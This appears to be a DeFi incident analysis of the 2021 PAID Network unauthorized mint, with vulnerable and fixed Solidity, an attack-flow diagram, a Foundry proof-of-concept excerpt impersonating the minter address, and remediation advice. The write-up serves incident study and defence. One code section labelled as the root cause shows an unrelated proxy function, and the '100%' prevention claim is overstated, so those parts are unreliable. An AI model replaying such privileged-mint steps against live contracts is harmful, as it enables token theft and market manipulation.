# PAID Network — Unauthorized mint() Access Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2021-03-07 |
| **Protocol** | PAID Network |
| **Chain** | Ethereum |
| **Loss** | ~$180,000,000 (59.4 trillion PAID tokens minted; only a portion was actually sold) |
| **Attacker** | [0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE](https://etherscan.io/address/0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE) |
| **Attack Tx** | Address unconfirmed (direct on-chain call via key compromise / rug pull) |
| **Vulnerable Contract** | [0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df](https://etherscan.io/address/0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df) (PAID Token) |
| **Root Cause** | The key with access to the mint() function was compromised (or rug pulled), enabling unlimited token minting |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-03/PAID_exp.sol) |

---
## 1. Vulnerability Overview

The `mint()` function of the PAID Network token contract (0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df) was designed to be callable only by a specific privileged address. However, the corresponding private key (0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE) was leaked or abused by an insider, resulting in 59.4 trillion PAID tokens being minted.

The PoC uses Foundry's `vm.prank()` cheatcode to impersonate the attacker address and call `mint()` directly to reproduce the incident. This was not a logic flaw in the access control itself, but rather an incident caused by privileged key management failure (key compromise or intentional rug pull).

---
## 2. Vulnerable Code Analysis

### 2.1 mint() — Concentrated Single EOA Privilege

```solidity
// ❌ A single EOA holds exclusive minting authority
// PAID Token @ 0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df
contract PAIDToken is ERC20, Ownable {
    // Only onlyOwner or a single minter role is checked
    function mint(address to, uint256 amount) external onlyMinter {
        _mint(to, amount);
        // No upper bound on amount, no total supply cap
    }
}
```

**Fixed Code**:
```solidity
// ✅ Multisig + mint cap + time lock
contract PAIDToken is ERC20 {
    address public multisig;      // Gnosis Safe or equivalent multisig wallet
    uint256 public constant MAX_MINT_PER_TX = 1_000_000 * 1e18;
    uint256 public lastMintTime;
    uint256 public constant MINT_COOLDOWN = 24 hours;

    function mint(address to, uint256 amount) external {
        require(msg.sender == multisig, "PAIDToken: only multisig");
        require(amount <= MAX_MINT_PER_TX, "PAIDToken: exceeds mint limit");
        require(block.timestamp >= lastMintTime + MINT_COOLDOWN, "PAIDToken: cooldown");
        lastMintTime = block.timestamp;
        _mint(to, amount);
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**AdminUpgradeabilityProxy.sol** — Entry point:
```solidity
// ❌ Root cause: The key with access to mint() was compromised (or rug pulled), enabling unlimited token minting
  function admin() external ifAdmin returns (address) {
    return _admin();
  }
```

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│ Step 1: Attacker obtains minter privilege key               │
│ (key compromise or insider rug pull)                        │
│ Address: 0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE        │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│ Step 2: Direct call to PAIDToken.mint()                     │
│ @ 0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df               │
│ mint(attacker, 59_471_745_571_548_000_000_000_000_000_000)  │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│ Step 3: Newly minted PAID dumped on Uniswap                 │
│ Existing LP investors suffer losses — PAID price -95%       │
└─────────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// testExploit() core logic excerpt — mainnet fork block 11,979,839
function testExploit() public {
    // Impersonate minter address via vm.prank
    cheats.prank(0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE);

    // Direct call to PAID token mint()
    // @ 0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df
    IPAIDToken(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df).mint(
        address(this),
        59_471_745_571_548_000_000_000_000_000_000  // 59.4 trillion PAID
    );

    // Verify balance
    emit log_named_uint(
        "PAID Balance after exploit",
        IERC20(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df).balanceOf(address(this))
    );
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Minting authority concentrated in a single EOA — key compromise collapses the entire token economy | CRITICAL | CWE-284 |
| V-02 | No upper bound on mint() calls — arbitrary supply inflation possible | HIGH | CWE-20 |

---
## 6. Remediation Recommendations

```solidity
// ✅ Distribute minter role across multisig wallet (e.g. Gnosis Safe)
// ✅ Apply on-chain TimelockController

// Example using OpenZeppelin TimelockController
contract PAIDGovernance {
    TimelockController public timelock;
    // mint execution delayed by a minimum of 48 hours
    // 2-of-3 multisig required
    constructor(address[] memory proposers, address[] memory executors) {
        timelock = new TimelockController(
            48 hours,   // minDelay
            proposers,  // proposer list
            executors   // executor list
        );
    }
}
```

---
## 7. Lessons Learned

- **Granting token minting authority to a single EOA is extremely dangerous.** A single key compromise is enough to collapse the entire token economy.
- **The line between rug pull and hack was ambiguous in this incident.** It remained unclear whether an insider executed this intentionally or an external attacker stole the key.
- **Multisig + timelock can prevent this class of attack 100%.** High-risk operations such as minting privileges must always be protected by these mechanisms.